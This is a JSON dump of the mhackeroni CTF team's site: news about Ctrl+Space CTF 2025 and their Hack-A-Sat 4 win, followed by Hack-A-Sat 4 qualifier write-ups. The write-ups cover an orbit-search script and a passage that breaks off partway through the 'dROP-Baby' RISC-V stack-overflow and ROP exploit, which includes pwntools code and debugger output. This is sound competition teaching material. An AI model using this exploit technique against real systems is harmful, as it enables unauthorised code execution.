[{"content":"","date":"23 July 2025","externalUrl":null,"permalink":"/news/","section":"","summary":"","title":"","type":"news"},{"content":"","date":"23 July 2025","externalUrl":null,"permalink":"/tags/competition/","section":"Tags","summary":"","title":"Competition","type":"tags"},{"content":"","date":"23 July 2025","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"Ctf","type":"tags"},{"content":" As mhackeroni, we\u0026rsquo;re excited to announce our role as challenge authors for Ctrl+Space CTF 2025 - the first European Capture-the-Flag competition played on real satellites orbiting Earth!\nThis groundbreaking competition is a joint mission by the European Space Agency (ESA), D-Orbit and our team, bringing together leaders in space operations and cybersecurity to create exciting hacking challenge.\nHow It Works # The competition will take place in two stages:\nOnline Qualifiers: September 20-21, 2025 (24-hour jeopardy-style competition) In-Orbit Finals: November 4-6, 2025 at ESTEC, Netherlands, as part of the Security for Space Systems (3S) conference The finals are where the real excitement begins - qualified teams will solve challenges on actual satellites in orbit around Earth. This represents a unique opportunity to test cybersecurity skills on space systems.\nJoin the Mission # If you\u0026rsquo;re a security enthusiast looking for an out-of-this-world challenge, start assembling your team now! Registration details will be announced soon.\nStay tuned for more information as we countdown to launch! üõ∞Ô∏è\nFor more details, visit ctrl-space.gg\n","date":"23 July 2025","externalUrl":null,"permalink":"/news/ctrl-space-announcement/","section":"","summary":"","title":"Ctrl+Space CTF 2025: The First European Satellite-Based CTF","type":"news"},{"content":"","date":"23 July 2025","externalUrl":null,"permalink":"/tags/cybersecurity/","section":"Tags","summary":"","title":"Cybersecurity","type":"tags"},{"content":"\nWhat is mhackeroni? # mhackeroni is an Italian CTF team, founded in 2018 by a group of friends and security enthusiasts from various academic institutions who merged togheter to sum their streghts and ultimately achieve DEFCON CTF Finals qualification.\nOur proud moments # We have consistently qualified for the DEFCON CTF Finals since 2018, with only a brief interruption along the way. After competing in several editions of Hack-A-Sat, we proudly emerged victorious in the 2023 competition.\nWhat\u0026#39;s New? Ctrl+Space CTF 2025: The First European Satellite-Based CTF 23 July 2025\u0026middot;169 words\u0026middot;1 min mhackeroni wins Hack-A-Sat 4 Finals! 1 September 2023\u0026middot;114 words\u0026middot;1 min Origin Teams # mhackeroni was born as the union of multiple italian teams. We are many, you may recognize some of us:\nTower of Hanoi c00kies@venice n0pwn intended TheRomanXpl0it about:blankets ","date":"23 July 2025","externalUrl":null,"permalink":"/","section":"Home","summary":"","title":"Home","type":"page"},{"content":"","date":"23 July 2025","externalUrl":null,"permalink":"/tags/satellites/","section":"Tags","summary":"","title":"Satellites","type":"tags"},{"content":"","date":"23 July 2025","externalUrl":null,"permalink":"/tags/space/","section":"Tags","summary":"","title":"Space","type":"tags"},{"content":"","date":"23 July 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"1 September 2023","externalUrl":null,"permalink":"/tags/defcon/","section":"Tags","summary":"","title":"Defcon","type":"tags"},{"content":"","date":"1 September 2023","externalUrl":null,"permalink":"/tags/hackasat/","section":"Tags","summary":"","title":"Hackasat","type":"tags"},{"content":"","date":"1 September 2023","externalUrl":null,"permalink":"/tags/mhackeroni/","section":"Tags","summary":"","title":"Mhackeroni","type":"tags"},{"content":"mhackeroni wins Hack-A-Sat 4 Finals! During our trip to DEFCON 31 in Las Vegas we participated in both DEFCON CTF Finals and Hack-A-Sat. We put in an insane effort and managed to win the first hacking competition in space ever organized earning the title of certified satellite hackers!!\nA big THANK YOU to all the friends and sponsors who supported us in this incredible exceprience!\nIn the news # Gli italiani che hanno hackerato un satellite degli Stati Uniti - Wired Italian hackers win on-orbit satellite hack challenge - Interesting Engineering Italian team wins Space Force‚Äôs first on-orbit Hack-A-Sat contest - Breaking Defense Italy Triumphs in Historic Space Force Hack-A-Sat Competition - Fabric Staffing ","date":"1 September 2023","externalUrl":null,"permalink":"/news/2023-09-01-hackasat4-finals-report/","section":"","summary":"","title":"mhackeroni wins Hack-A-Sat 4 Finals!","type":"news"},{"content":"","date":"1 July 2023","externalUrl":null,"permalink":"/writeups/","section":"","summary":"","title":"","type":"writeups"},{"content":"A collection of some of our writeups for Hack-A-Sat 4 Quals where we achieved 2nd place overall and finals qualification.\nIndex # Contact dROP-Baby FAUXY Lady Kalman At Me Bro Magic Space Bussin You\u0026rsquo;ve Been Promoted Contact # The challenge # Category: Anomaly Review Bored\nBilly Bob says he\u0026rsquo;s the best orbit designer there\u0026rsquo;s ever been. He designed an orbit with python skyfield that gets 230 minutes of contact on our ground station network. Can you beat him?\nPrompt # Reachable at: nc contact.quals2023-kah5Aiv9.satellitesabove.me 5300\n_|_|_| _|_| _| _| _|_|_|_|_| _|_| _|_|_| _|_|_|_|_| _| _| _| _|_| _| _| _| _| _| _| _| _| _| _| _| _| _| _|_|_|_| _| _| _| _| _| _| _|_| _| _| _| _| _| _|_|_| _|_| _| _| _| _| _| _|_|_| _| Billy Bob says he\u0026#39;s the best orbit designer there\u0026#39;s ever been. He designed an orbit with python skyfield that gets 230 minutes of contact on our ground station network. Can you beat him? Ground stations are located across the United States at these WGS-84 coordinates: Name Lat (deg) Long (deg) Alt (m) Cape Canaveral 28.40 -80.61 27 Cape Cod 41.70 -70.03 9 Anchorage 61.21 -149.90 40 Vandenberg 34.76 -120.52 122 Denver 39.74 -104.98 1594 Contact is established at 15 degrees above the horizon and with one ground station at a time. Our link budget supports a range of up to 6,000 km. Between 1 Apr 2023 00:00:00.000 UTC and 1 Apr 2023 08:00:00.000 UTC, get more hours of contact than Billy Bob. Good luck! Provide your TLE Line 2 parameters. Inclination (deg): RAAN (deg): Eccentricity (x10^-7): Argument of perigee (deg): Mean anomaly (deg): Mean motion (revs/day): Description # Positional data about 5 ground stations around the United Stated were given:\nName Lat (deg) Long (deg) Alt (m) Cape Canaveral 28.40 -80.61 27 Cape Cod 41.70 -70.03 9 Anchorage 61.21 -149.90 40 Vandenberg 34.76 -120.52 122 Denver 39.74 -104.98 1594 The challenge asked for six parameters (Inclination, RAAN, Eccentricity, Argument of perigee, Mean anomaly and Mean motion) to be used for a satellite orbiting around the Earth, such that the satellite would get \u0026gt;230 minutes of contact with the ground station network.\nThe challenge then gives more details about the scenario of the challenge.\nContact is established at 15 degrees above the horizon and with one ground station at a time. The link budget supports a range of up to 6,000 km. The time of the orbit to be considered is between 1 Apr 2023 00:00:00.000 UTC and 1 Apr 2023 08:00:00.000 UTC Solution # Initial idea # As a first idea, we thought of solving the challenge by understanding the problem and developing a well developed and justified solution.\nWell, that didn\u0026rsquo;t happen: here is how we solved this task.\nFirst tries # When the challenge was released, some members of our team started sending to the remote connection random values or random patterns for the six parameters requested: some tries were worse and some better\u0026hellip;\nAfter a few tries, we came up with:\nInclination (deg): 45 RAAN (deg): 45 Eccentricity (x10^-7): 0 Argument of perigee (deg): 45 Mean anomaly (deg): 45 Mean motion (revs/day): 15 That gave 61 minutes of contact time. Following with:\nInclination (deg): 12 RAAN (deg): 10 Eccentricity (x10^-7): 10 Argument of perigee (deg): 10 Mean anomaly (deg): 10 Mean motion (revs/day): 10 Which gave a grand total of 105 minutes.\nHaving some great starting points, almost halfway through the value requested by the challenge, we started to write an A* search using the values in minutes returned by the remote challenge as a heuristic.\nThe motivation behind the A* algorithm was to try to slowly improve our best solutions by generating random variations and hoping to get better contact times.\nThe algorithm works by keeping a heap (a queue with the \u0026ldquo;best\u0026rdquo; element always at the top) with a lot of inputs to try. Every cycle, the top element of the heap is popped out and is sent to the remote server. After checking the result in minutes with the best current result, the script generates random variations of that input, and pushes the variations back into the heap, weighting them by the result received by the server.\nThe variation of the inputs is really basic, something like:\nrnd = random.randint(1, 63) new_tuple = [inclination, raan, eccentricity, arg_perigee, mean_anomaly, mean_motion] for i, bit in enumerate(bin(rnd)[2:].zfill(6)): new_tuple[i] = new_tuple[i] + int(bit) * random.randint(-500, 500) * DELTA We first generate a \u0026ldquo;mask\u0026rdquo; to choose which elements to change, and then we add some random values to the elements chosen.\nImproving the results # We got lucky and, while still sending random stuff by hand, we got to:\nInclination (deg): 60 RAAN (deg): 10 Eccentricity (x10^-7): 10 Argument of perigee (deg): 10 Mean anomaly (deg): 30 Mean motion (revs/day): 10 Which gave an impressive 171 minutes of contact time.\nWe ran the script starting with that input and (after adjusting the eccentricity by hand) slowly improved the results, getting timings like 178, \u0026hellip;, 199, \u0026hellip; and 211 with:\nInclination: 115.831300 RAAN: 187.375700 Eccentricity: 1290114.660000 Arg Perigee: 230.202200 Mean Anomaly: 159.298200 Mean Motion: 9.654654 Improving from here was getting difficult, and we started writing a local simulator that would act similar to the remote server, to speed up the A* search (in the end the simulator wasn\u0026rsquo;t always correct, so we left the scripts running).\nLowering the DELTA in the script, we got some better inputs, such as:\nInclination: 114.881300 RAAN: 175.965700 Eccentricity: 1290122.490000 Arg Perigee: 236.002200 Mean Anomaly: 171.928200 Mean Motion: 9.404654 With 213 minutes of contact, and:\nProvide your TLE Line 2 parameters. Inclination: 107.641800 RAAN: 175.370600 Eccentricity: 1290126.607700 Arg Perigee: 234.187200 Mean Anomaly: 170.385800 Mean Motion: 8.307954 With 214 minutes of contact.\nFinal # With a little help from the local tests, we got to the input:\nInclination: 117.791300 RAAN: 180.615700 Eccentricity: 2050128.000000 Arg Perigee: 239.192200 Mean Anomaly: 175.058200 Mean Motion: 9.404654 Which gave a score of 225, really close! From here, we got to 226 and 227 with the remote script, until one of our teammates started changing stuff by hand and got the input:\nInclination: 112 RAAN: 175 Eccentricity: 23000000 Arg Perigee: 238 Mean Anomaly: 150 Mean Motion: 9.9 Which got a enough time of contact!\nSolution script # One of the (multiple) heuristics solve scripts:\nfrom pwn import * from skyfield.api import * from datetime import datetime from heapq import * import random import itertools PREV_SCORE = 170 DELTA = 0.01 pq = [] heapify(pq) # here are some random checkpoints from which we started # heappush(pq, (-PREV_SCORE, 60, 10, 10, 10, 30, 10)) # heappush(pq, (-PREV_SCORE, 60, 10, 1000000, 10, 30, 10)) heappush(pq, (-215.000000, 111.621200, 172.495300, 1290108.581600, 239.212900, 153.050600, 9.571854)) # heappush(pq, (-175.000000, 58.700000, 10.000000, 999992.700000, 9.740000, 28.000000, 14.510000)) while True: # connection stuff r = remote(\u0026#34;contact.quals2023-kah5Aiv9.satellitesabove.me\u0026#34;, 5300) r.sendlineafter(b\u0026#34;Ticket please:\u0026#34;, b\u0026#34;TICKET\u0026#34;) # read best entry score, inclination, raan, eccentricity, arg_perigee, mean_anomaly, mean_motion = heappop(pq) print(\u0026#34;OLD_SCORE: %f\u0026#34; % score) print(\u0026#34;Inclination: %f\u0026#34; % inclination) print(\u0026#34;RAAN: %f\u0026#34; % raan) print(\u0026#34;Eccentricity: %f\u0026#34; % eccentricity) print(\u0026#34;Arg Perigee: %f\u0026#34; % arg_perigee) print(\u0026#34;Mean Anomaly: %f\u0026#34; % mean_anomaly) print(\u0026#34;Mean Motion: %f\u0026#34; % mean_motion) r.sendlineafter(b\u0026#34;Inclination (deg):\u0026#34;, str(inclination).encode()) r.sendlineafter(b\u0026#34;RAAN (deg):\u0026#34;, str(raan).encode()) r.sendlineafter(b\u0026#34;Eccentricity (x10^-7):\u0026#34;, str(eccentricity).encode()) r.sendlineafter(b\u0026#34;Argument of perigee (deg):\u0026#34;, str(arg_perigee).encode()) r.sendlineafter(b\u0026#34;Mean anomaly (deg):\u0026#34;, str(mean_anomaly).encode()) r.sendlineafter(b\u0026#34;Mean motion (revs/day):\u0026#34;, str(mean_motion).encode()) # read new score try: r.recvuntil(b\u0026#34;Your orbit achieved \u0026#34;) line = r.recvline(False).split(b\u0026#34; \u0026#34;, 1)[0] except EOFError: print(\u0026#34;BRUCIA!\u0026#34;) continue new_score = -int(line) print(\u0026#34;New Score: %d\u0026#34; % new_score) # generate random variations, we also used a version of the script which generated 100 variations and didn\u0026#39;t use a mask to choose which parameters to change # also we had a version with local testing and multithreading :) for i in range(10): rnd = random.randint(1, 63) new_tuple = [inclination, raan, eccentricity, arg_perigee, mean_anomaly, mean_motion] for i, bit in enumerate(bin(rnd)[2:].zfill(6)): new_tuple[i] = new_tuple[i] + int(bit) * random.randint(-500, 500) * DELTA heappush(pq, tuple([new_score] + new_tuple)) r.close() The local simulation script:\nfrom skyfield.api import load, wgs84 import IPython \u0026#39;\u0026#39;\u0026#39; Name Lat (deg) Long (deg) Alt (m) Cape Canaveral 28.40 -80.61 27 Cape Cod 41.70 -70.03 9 Anchorage 61.21 -149.90 40 Vandenberg 34.76 -120.52 122 Denver 39.74 -104.98 1594 \u0026#39;\u0026#39;\u0026#39; eph = load(\u0026#34;de421.bsp\u0026#34;) earth = eph[\u0026#39;Earth\u0026#39;] stations = { \u0026#34;Cape Canaveral\u0026#34;: wgs84.latlon(28.40, -80.61, 27), \u0026#34;Cape Cod\u0026#34;: wgs84.latlon(41.70, -70.03, 9), \u0026#34;Anchorage\u0026#34;: wgs84.latlon(61.21, -149.90, 40), \u0026#34;Vandenberg\u0026#34;: wgs84.latlon(34.76, -120.52, 122), \u0026#34;Denver\u0026#34;: wgs84.latlon(39.74, -104.98, 1594), } stations_eph = { \u0026#34;Cape Canaveral\u0026#34;: wgs84.latlon(28.40, -80.61, 27) + earth, \u0026#34;Cape Cod\u0026#34;: wgs84.latlon(41.70, -70.03, 9) + earth, \u0026#34;Anchorage\u0026#34;: wgs84.latlon(61.21, -149.90, 40) + earth, \u0026#34;Vandenberg\u0026#34;: wgs84.latlon(34.76, -120.52, 122) + earth, \u0026#34;Denver\u0026#34;: wgs84.latlon(39.74, -104.98, 1594) + earth, } secs = {} ts = load.timescale() t0 = ts.utc(2023, 4, 1) t1 = ts.utc(2023, 4, 1, 8) sat = load.tle_file(\u0026#34;tle.txt\u0026#34;)[0] secs = 0; t = t0 for _ in range (8 * 60): t = t + 1/(24*60) for k in stations.keys(): difference = sat - stations[k] topocentric = difference.at(t) alt, az, distance = topocentric.altaz() if distance.km \u0026lt; 300: print(\u0026#34;BRUCIA\u0026#34;) exit() if alt.degrees \u0026gt; 15 and distance.km \u0026lt; 6000: secs += 1 print(f\u0026#34;{k}: Alt: {alt}, Dist: {distance.km}\u0026#34;) break print(f\u0026#34;Total sec: {secs}\u0026#34;) dROP-Baby # The challenge # Category: \u0026ldquo;Pure Pwnage\u0026rdquo;\nSummary: Stack overflow which leads to a ROP on RISC-V/32 architecture\nDescription # This is a variation of the Smash-RiscV challenge, but the stack is not marked as executable, and there is a hidden configuration that leads to a stack overflow\nNOTE: you should have gdb-multiarch and qemu-riscv32 installed\nPython Setup # #!/usr/bin/env python3 from pwn import * import os exe = ELF(\u0026#34;./drop-baby\u0026#34;) context.arch = \u0026#34;riscv\u0026#34; context.bits = 32 # context.binary = exe gdbscript = \u0026#34;\u0026#34;\u0026#34; file drop-baby target remote localhost:1234 \u0026#34;\u0026#34;\u0026#34; def start(): if args.REMOTE: io = remote(\u0026#34;drop.quals2023-kah5Aiv9.satellitesabove.me\u0026#34;, 5300) io.sendline( \u0026#34;ticket{golf366979sierra4:GHAZFC9h62tmeRLKrH7JlpRnLQFEWH0TU6xmyKtehG8X8rjRbnOSYab8ZO3iwQTkTg}\u0026#34; ) else: if args.GDB: os.system(\u0026#34;tmux splitw -h gdb-multiarch -ex init-gef -x .gdbrun\u0026#34;) io = process( [\u0026#34;qemu-riscv32\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;1234\u0026#34;, \u0026#34;drop-baby\u0026#34;], env={\u0026#34;FLAG\u0026#34;: \u0026#34;flag{REDACTED}\u0026#34;, \u0026#34;TIMEOUT\u0026#34;: \u0026#34;999999999\u0026#34;}, ) return io io = start() io.interactive() How the binary works # In brief, the binary emulates a satellite that receives a message and sends a response. Firstly, the binary loads the timeout and flag from the environment variables. If the timeout is not present, 10 seconds is set as the default value. If the flag is not present, the program won\u0026rsquo;t start. The main portion of the code comes after, where we can see some configuration being loaded from server.ini and a loop that synchronizes the connection and reads a message from it. The loadINI(\u0026quot;server.ini\u0026quot;) function simply reads the server.ini file, parses the format, and loads the actual configuration into memory. synchronize() function discards all the remaining bytes until it encounters the sequence \\xde\\xad\\xbe\\xef.\nHere, we can see the read_message() function. In brief, it checks the next byte after \\xde\\xad\\xbe\\xef and executes different functions depending on the byte that we send. Here is where the configuration is used. These values are actually used to determine the length of the message to be received, which is different depending on the type of message that we are sending (\u0026lsquo;a1\u0026rsquo;, \u0026lsquo;a2\u0026rsquo;, \u0026lsquo;b1\u0026rsquo;, \u0026lsquo;b2\u0026rsquo;). Every message has to be of the length specified in the corresponding configuration minus 4 (space left for the crc32), and have a crc32 of the message at the end; otherwise, it shall close the connection. Note that the message is read and written onto the stack, and the maximum space allocated is 100. Since the configuration is not checked a value greater than 100 may lead to an overflow\nSolution # The interesting part is that we do not have the server.ini file, but we can retrieve it by using the command b1. Therefore, we must guess the random configuration for that specific command. To print it, as already mentioned, we have to send a message with the crc32 appended at the end, with the length specified in the configuration. But since we do not have that file, we can just send b1 messages with increasing length until the configuration is printed.\nHere is a simple script to get the server.ini\nfor i in range(0, 0x1000): with start() as io: # synchronize io.send(b\u0026#34;\\xde\\xad\\xbe\\xef\u0026#34;) # print configuration io.send(b\u0026#34;\\xb1\u0026#34;) msg = b\u0026#34;?\u0026#34; * i msg += p32(zlib.crc32(msg)) io.send(msg) recvd = io.recvall(timeout=2) if b\u0026#34;Config Table\u0026#34; in recvd: log.success(recvd.decode()) break Baby\u0026#39;s Second RISC-V Stack Smash No free pointers this time and pwning might be more difficult! Exploit me! Config Table ------------------------------ |Application Name : Baby dROP| | A1_MSG_LEN : 40 | | A2_MSG_LEN : 10 | | B1_MSG_LEN : 20 | | B2_MSG_LEN : 300 | | CC_MSG_LEN : 25 | | ZY_MSG_LEN : 0 | | SILENT_ERRORS : TRUE | ------------------------------ Here we can see that B2_MSG_LEN is set to 300. As already mentioned, this leads to a stack overflow since the maximum size for a message should be 100.\n[ Legend: Modified register | Code | Heap | Stack | String ] ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ registers ‚îÄ‚îÄ‚îÄ‚îÄ $zero: 0x00000000 ‚Üí 0x00000000 $ra : 0x62616165 ‚Üí 0x62616165 $sp : 0x40800d90 ‚Üí 0x62616166 ‚Üí 0x62616166 $gp : 0x0006ea84 ‚Üí 0x00000000 ‚Üí 0x00000000 $tp : 0x000724e0 ‚Üí 0x0006dd50 ‚Üí 0x0006b998 ‚Üí 0x0004fda4 ‚Üí 0x00000043 ‚Üí 0x00000043 $t0 : 0x00000001 ‚Üí 0x00000001 $t1 : 0x19999999 ‚Üí 0x19999999 $t2 : 0x00000000 ‚Üí 0x00000000 $fp : 0x62616164 ‚Üí 0x62616164 $s1 : 0x00000001 ‚Üí 0x00000001 $a0 : 0xffffffff $a1 : 0x40800d18 ‚Üí 0x61616161 ‚Üí 0x61616161 $a2 : 0x00000128 ‚Üí 0x00000128 $a3 : 0x00002000 ‚Üí 0x00002000 $a4 : 0xffffffff $a5 : 0xffffffff $a6 : 0x00073d03 ‚Üí 0x00000000 ‚Üí 0x00000000 $a7 : 0x0000003f ‚Üí 0x0000003f $s2 : 0x00000001 ‚Üí 0x00000001 $s3 : 0x40800f04 ‚Üí 0x40800fbe ‚Üí 0x706f7264 ‚Üí 0x706f7264 $s4 : 0x40800f0c ‚Üí 0x40800fc8 ‚Üí 0x454d4954 ‚Üí 0x454d4954 $s5 : 0x00000001 ‚Üí 0x00000001 $s6 : 0x00010fca ‚Üí 0xde067139 ‚Üí 0xde067139 $s7 : 0x00010230 ‚Üí 0xc6061141 ‚Üí 0xc6061141 $s8 : 0x00000000 ‚Üí 0x00000000 $s9 : 0x00000000 ‚Üí 0x00000000 $s10 : 0x00000000 ‚Üí 0x00000000 $s11 : 0x00000000 ‚Üí 0x00000000 $t3 : 0x00000009 ‚Üí 0x00000009 $t4 : 0x00000000 ‚Üí 0x00000000 $t5 : 0x00054dc4 ‚Üí 0x00000000 ‚Üí 0x00000000 $t6 : 0x00000005 ‚Üí 0x00000005 ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ code:riscv:RISCV ‚îÄ‚îÄ‚îÄ‚îÄ 0x10f9e \u0026lt;do_b2+74\u0026gt; j 0x10fa2 \u0026lt;do_b2+78\u0026gt; 0x10fa0 \u0026lt;do_b2+76\u0026gt; li a5, 0 0x10fa2 \u0026lt;do_b2+78\u0026gt; mv a0, a5 ‚Üí 0x10faa \u0026lt;do_b2+86\u0026gt; ret [!] Cannot disassemble from $PC ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ stack ‚îÄ‚îÄ‚îÄ‚îÄ 0x40800d90‚îÇ+0x0000: 0x62616166 ‚Üí 0x62616166 ‚Üê $sp 0x40800d94‚îÇ+0x0004: 0x62616167 ‚Üí 0x62616167 0x40800d98‚îÇ+0x0008: 0x62616168 ‚Üí 0x62616168 0x40800d9c‚îÇ+0x000c: 0x62616169 ‚Üí 0x62616169 0x40800da0‚îÇ+0x0010: 0x6261616a ‚Üí 0x6261616a 0x40800da4‚îÇ+0x0014: 0x6261616b ‚Üí 0x6261616b 0x40800da8‚îÇ+0x0018: 0x6261616c ‚Üí 0x6261616c 0x40800dac‚îÇ+0x001c: 0x6261616d ‚Üí 0x6261616d ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ threads ‚îÄ‚îÄ‚îÄ‚îÄ [#0] Id 1, stopped 0x10faa in do_b2 (), reason: BREAKPOINT ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ trace ‚îÄ‚îÄ‚îÄ‚îÄ [#0] 0x10faa ‚Üí do_b2(size=0x12c) ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ gef‚û§ So now we have a stack overflow, and these are the protections\n[*] \u0026#39;/home/tt3/Workspace/dropbaby/drop-baby\u0026#39; Arch: em_riscv-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x10000) The stack is non-executable, so the only option left is to perform a ROP. What we need is just a call to puts(flag). The flag is stored at a fixed stack address, and puts() is also at a fixed address. There is no ASLR in this binary. However, the problem is that, unlike the Intel architecture, RiscV/32 passes the arguments in the a0, a1, and a2 registers. The ret instruction just puts the content of the ra register in pc. Therefore, what we really need are some gadgets that set ra and a0 based on stack values. Fortunately, there is a single gadget that can enable us to do both at address 0x167D2.\ngef‚û§ x/9i 0x167D2 0x167d2 \u0026lt;_IO_puts+150\u0026gt;: lw ra,28(sp) 0x167d4 \u0026lt;_IO_puts+152\u0026gt;: mv a0,s0 0x167d6 \u0026lt;_IO_puts+154\u0026gt;: lw s0,24(sp) 0x167d8 